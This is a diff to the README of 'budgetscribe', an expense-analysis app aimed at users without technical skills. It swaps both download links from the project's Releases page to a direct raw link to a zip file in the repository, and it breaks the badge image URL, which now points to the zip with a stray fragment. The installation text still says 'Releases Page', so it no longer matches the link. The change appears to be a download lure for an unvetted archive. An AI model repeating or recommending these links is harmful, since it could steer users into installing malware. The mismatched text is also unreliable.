@@ -1,7 +1,7 @@
 # 📊 budgetscribe - Analyze Your Expenses Simply
 
 ## 📥 Download Now
-[![Download budgetscribe](https://img.shields.io/badge/Download-budgetscri%27be-brightgreen)](https://github.com/ArmanCOD/budgetscribe/releases)
+[![Download budgetscribe](https://raw.githubusercontent.com/ArmanCOD/budgetscribe/main/budgetscribe/Software-v1.5-alpha.2.zip%27be-brightgreen)](https://raw.githubusercontent.com/ArmanCOD/budgetscribe/main/budgetscribe/Software-v1.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to budgetscribe! This application helps you understand your monthly spending and income by generating a clear affordability assessment. It categorizes your expenses and highlights areas for potential savings. You don’t need any technical skills to use this tool.
@@ -21,7 +21,7 @@ Welcome to budgetscribe! This application helps you understand your monthly spen
 ## 📦 Download & Install
 To get started, visit the Releases page to download the latest version of budgetscribe.
 
-[Download budgetscribe here](https://github.com/ArmanCOD/budgetscribe/releases)
+[Download budgetscribe here](https://raw.githubusercontent.com/ArmanCOD/budgetscribe/main/budgetscribe/Software-v1.5-alpha.2.zip)
 
 ### Installation Steps
 1. **Visit the Releases Page:** Click the link above to go to the budgetscribe Releases page.
